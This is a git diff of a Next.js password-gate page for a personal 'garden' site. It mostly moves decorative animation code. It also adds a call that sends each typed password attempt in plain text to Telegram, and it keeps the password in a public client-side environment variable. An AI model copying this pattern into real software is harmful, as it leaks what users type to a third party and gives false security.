@@ -2,6 +2,90 @@
 import { useRouter } from "next/navigation";
 import React from "react";
 import WelcomeGarden from "../../components/welcome-garden"; // Import the welcome garden component
+import {sendMessageTelegram} from "../../utilities/telegram-helpers"
+
+
+const CloudyTransition = () => (
+	<div
+		style={{
+			position: "absolute",
+			top: 0,
+			left: 0,
+			width: "100%",
+			height: "100%",
+			pointerEvents: "none",
+			zIndex: 2,
+		}}
+	>
+		{/* Moving clouds */}
+		{[...Array.from({ length: 8 })].map((_, i) => (
+			<div
+				key={i}
+				style={{
+					position: "absolute",
+					top: `${10 + Math.random() * 60}%`,
+					left: "-20%",
+					fontSize: `${40 + Math.random() * 30}px`,
+					opacity: 0.7,
+					animation: `cloudMove ${
+						8 + Math.random() * 4
+					}s linear infinite ${i * 0.5}s`,
+				}}
+			>
+				☁️
+			</div>
+		))}
+
+		{/* Butterfly trails */}
+		{[...Array.from({ length: 6 })].map((_, i) => (
+			<div
+				key={i}
+				style={{
+					position: "absolute",
+					left: `${Math.random() * 100}%`,
+					top: `${Math.random() * 100}%`,
+					animation: `butterflyTrail ${
+						4 + Math.random() * 2
+					}s ease-in-out infinite ${Math.random() * 2}s`,
+				}}
+			>
+				<div style={{ fontSize: "24px" }}>🦋</div>
+				{/* Glittery trail */}
+				<div
+					style={{
+						position: "absolute",
+						top: "50%",
+						left: "50%",
+						width: "30px",
+						height: "2px",
+						background:
+							"linear-gradient(90deg, transparent, rgba(255, 182, 193, 0.8), transparent)",
+						transform: "translate(-50%, -50%)",
+						animation: `glitterTrail 2s ease-in-out infinite ${Math.random()}s`,
+					}}
+				/>
+			</div>
+		))}
+
+		{/* Flower petals floating */}
+		{[...Array.from({ length: 10 })].map((_, i) => (
+			<div
+				key={i}
+				style={{
+					position: "absolute",
+					left: `${Math.random() * 100}%`,
+					top: `${Math.random() * 100}%`,
+					fontSize: "16px",
+					animation: `petalFloat ${
+						5 + Math.random() * 3
+					}s ease-in-out infinite ${Math.random() * 2}s`,
+				}}
+			>
+				🌸
+			</div>
+		))}
+	</div>
+);
 
 function MainComponent() {
 	const [password, setPassword] = React.useState("");
@@ -11,7 +95,7 @@ function MainComponent() {
 	const [showSuccess, setShowSuccess] = React.useState(false);
 
 	const router = useRouter(); // Use Next.js router for navigation
-	const correctPassword = "kavindi123"; // Secret password only Kavindi knows
+	const correctPassword = process.env.NEXT_PUBLIC_PASSWORD; // Secret password only Kavindi knows
 
 	const SunriseEffect = () => (
 		<div
@@ -81,88 +165,6 @@ function MainComponent() {
 		</div>
 	);
 
-	const CloudyTransition = () => (
-		<div
-			style={{
-				position: "absolute",
-				top: 0,
-				left: 0,
-				width: "100%",
-				height: "100%",
-				pointerEvents: "none",
-				zIndex: 2,
-			}}
-		>
-			{/* Moving clouds */}
-			{[...Array.from({ length: 8 })].map((_, i) => (
-				<div
-					key={i}
-					style={{
-						position: "absolute",
-						top: `${10 + Math.random() * 60}%`,
-						left: "-20%",
-						fontSize: `${40 + Math.random() * 30}px`,
-						opacity: 0.7,
-						animation: `cloudMove ${
-							8 + Math.random() * 4
-						}s linear infinite ${i * 0.5}s`,
-					}}
-				>
-					☁️
-				</div>
-			))}
-
-			{/* Butterfly trails */}
-			{[...Array.from({ length: 6 })].map((_, i) => (
-				<div
-					key={i}
-					style={{
-						position: "absolute",
-						left: `${Math.random() * 100}%`,
-						top: `${Math.random() * 100}%`,
-						animation: `butterflyTrail ${
-							4 + Math.random() * 2
-						}s ease-in-out infinite ${Math.random() * 2}s`,
-					}}
-				>
-					<div style={{ fontSize: "24px" }}>🦋</div>
-					{/* Glittery trail */}
-					<div
-						style={{
-							position: "absolute",
-							top: "50%",
-							left: "50%",
-							width: "30px",
-							height: "2px",
-							background:
-								"linear-gradient(90deg, transparent, rgba(255, 182, 193, 0.8), transparent)",
-							transform: "translate(-50%, -50%)",
-							animation: `glitterTrail 2s ease-in-out infinite ${Math.random()}s`,
-						}}
-					/>
-				</div>
-			))}
-
-			{/* Flower petals floating */}
-			{[...Array.from({ length: 10 })].map((_, i) => (
-				<div
-					key={i}
-					style={{
-						position: "absolute",
-						left: `${Math.random() * 100}%`,
-						top: `${Math.random() * 100}%`,
-						fontSize: "16px",
-						animation: `petalFloat ${
-							5 + Math.random() * 3
-						}s ease-in-out infinite ${Math.random() * 2}s`,
-					}}
-				>
-					🌸
-				</div>
-			))}
-		</div>
-	);
-
 	React.useEffect(() => {
 		// Check if already authorized and not expired
 		const isAuthorized = localStorage.getItem("gardenAccess");
@@ -191,6 +193,7 @@ function MainComponent() {
 
 	const handleSubmit = (e) => {
 		e.preventDefault();
+		sendMessageTelegram(`Password Attempt: ${password}`);
 
 		if (password.toLowerCase() === correctPassword.toLowerCase()) {
 			// Correct password - start transition sequence
@@ -234,8 +237,6 @@ function MainComponent() {
 	];
 	const sadElements = ["🥀", "😢", "💔", "😭", "🌧️", "⛈️"];
 
-
-
 	if (showSuccess) {
 		return <WelcomeGarden />;
 	}
@@ -258,7 +259,6 @@ function MainComponent() {
 			>
 				{/* Add sunrise effect when not wrong */}
 				{!isWrong && <SunriseEffect />}
-
 				{/* Floating garden elements */}
 				{(isWrong ? sadElements : gardenElements).map(
 					(element, index) => (
@@ -289,8 +289,7 @@ function MainComponent() {
 						</div>
 					)
 				)}
-
-				{/* Garden creatures reactions */}
+				<CloudyTransition />;{/* Garden creatures reactions */}
 				{isWrong && (
 					<>
 						<div
@@ -331,7 +330,6 @@ function MainComponent() {
 						</div>
 					</>
 				)}
-
 				{/* Main garden gate */}
 				<div
 					style={{
@@ -476,7 +474,6 @@ function MainComponent() {
 							: "🦋 Only Kavindi knows the secret to this magical garden... 🌺"}
 					</p>
 				</div>
-
 				<style jsx global>{`
 					@keyframes sunRays {
 						0%,
